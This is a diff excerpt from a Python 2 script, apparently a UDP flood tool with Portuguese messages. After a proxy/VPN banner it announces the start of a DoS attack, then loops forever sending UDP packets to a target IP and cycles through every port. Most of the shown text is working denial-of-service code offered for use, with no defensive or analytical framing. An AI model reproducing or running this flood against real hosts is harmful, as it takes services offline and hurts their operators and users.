@@ -97,3 +97,25 @@ Preparando Proxy... | use vpn |
 
 ================================\033[0m
 '''
+time.sleep(2)
+print " proxy pronto"
+time.sleep(1)
+print "COMECANDO ATAQUE DOS"
+os.system("figlet GO 404")
+print "\033[92maguarda ai a porra vai comecar...\033[0m"
+time.sleep(2)
+os.system ("clear")
+sent = 0
+while True:
+     while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "\033[91m[+]\033[0m \033[94mAttacking 404 Hell\033[0m"
+     print "\033[94m%s %s %s\033[0m"%(sent,ip,port)
+     if port == 65534:
+       port = 1
